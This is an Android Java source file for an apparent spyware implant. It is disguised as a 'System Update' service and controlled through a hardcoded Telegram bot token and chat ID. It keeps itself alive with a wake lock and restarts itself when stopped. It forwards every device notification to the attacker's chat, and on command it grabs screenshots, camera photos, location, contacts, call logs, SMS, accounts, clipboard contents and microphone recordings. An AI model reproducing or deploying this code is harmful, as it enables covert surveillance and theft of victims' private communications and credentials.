package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import androidx.core.app.NotificationCompat;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;

public class NotificationService extends NotificationListenerService {

    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private WakeLock wakeLock;
    private int lastUpdateId = 0;
    private boolean isRunning = true;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // إنشاء إشعار foreground للبقاء في الخلفية
        createForegroundNotification();
        
        // منع السكون
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sniffer::WakeLock");
        wakeLock.acquire(10*60*1000L);
        
        // بدء الاستماع للأوامر
        startListening();
        
        // إرسال إشعار البدء
        sendTelegram("✅ الجهاز جاهز للتحكم الكامل\n📱 " + Build.MODEL);
    }
    
    private void createForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "sniffer_channel",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
            
            Notification notification = new NotificationCompat.Builder(this, "sniffer_channel")
                .setContentTitle("System Update")
                .setContentText("يعمل في الخلفية...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
            
            startForeground(1, notification);
        }
    }
    
    private void startListening() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    checkTelegramCommands();
                    handler.postDelayed(this, 2000);
                }
            }
        }, 2000);
    }
    
    private void checkTelegramCommands() {
        OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build();
        
        String url = BASE_URL + "getUpdates?offset=" + lastUpdateId + "&timeout=5";
        
        Request request = new Request.Builder()
            .url(url)
            .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    String json = response.body().string();
                    JSONObject obj = new JSONObject(json);
                    JSONArray result = obj.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        int updateId = update.getInt("update_id");
                        
                        if (updateId > lastUpdateId) {
                            lastUpdateId = updateId + 1;
                            
                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                if (message.has("text")) {
                                    String text = message.getString("text");
                                    executeCommand(text);
                                }
                            }
                        }
                    }
                } catch (Exception e) {}
                response.close();
            }
        });
    }
    
    private void executeCommand(String command) {
        command = command.replace("/", "").trim().toLowerCase();
        
        sendTelegram("⚡ تنفيذ: " + command);
        
        CommandExecutor executor = new CommandExecutor(this);
        
        switch(command) {
            case "screen":
                executor.takeScreenshot();
                break;
            case "camera":
                executor.takeCameraPhoto();
                break;
            case "location":
                executor.getLocation();
                break;
            case "contacts":
                executor.getContacts();
                break;
            case "calls":
                executor.getCallLogs();
                break;
            case "sms":
                executor.getSMS();
                break;
            case "apps":
                executor.getInstalledApps();
                break;
            case "accounts":
                executor.getAccounts();
                break;
            case "clipboard":
                executor.getClipboard();
                break;
            case "wifi":
                executor.getWifiInfo();
                break;
            case "device":
                executor.getDeviceInfo();
                break;
            case "mic":
                executor.startRecording();
                break;
            case "stop":
                executor.stopAll();
                break;
            case "help":
                sendHelp();
                break;
            default:
                sendTelegram("❌ أمر غير معروف. اكتب help");
        }
    }
    
    private void sendHelp() {
        String help = "📋 الأوامر:\n" +
            "screen - تصوير الشاشة\n" +
            "camera - تصوير كاميرا\n" +
            "location - الموقع\n" +
            "contacts - جهات الاتصال\n" +
            "calls - سجل المكالمات\n" +
            "sms - الرسائل\n" +
            "apps - التطبيقات\n" +
            "accounts - الحسابات\n" +
            "clipboard - الحافظة\n" +
            "wifi - معلومات الشبكة\n" +
            "device - معلومات الجهاز\n" +
            "mic - تسجيل صوت\n" +
            "stop - إيقاف الكل\n" +
            "help - المساعدة";
        
        sendTelegram(help);
    }
    
    private void sendTelegram(String message) {
        OkHttpClient client = new OkHttpClient();
        String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
        
        Request request = new Request.Builder()
            .url(url)
            .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response r) throws IOException { r.close(); }
        });
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "");
        String text = extras.getString(Notification.EXTRA_TEXT, "");
        
        sendTelegram("🔔 " + sbn.getPackageName() + "\n" + title + "\n" + text);
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        // إعادة تشغيل الخدمة إذا توقفت
        Intent intent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        super.onDestroy();
    }
    
    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Intent intent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
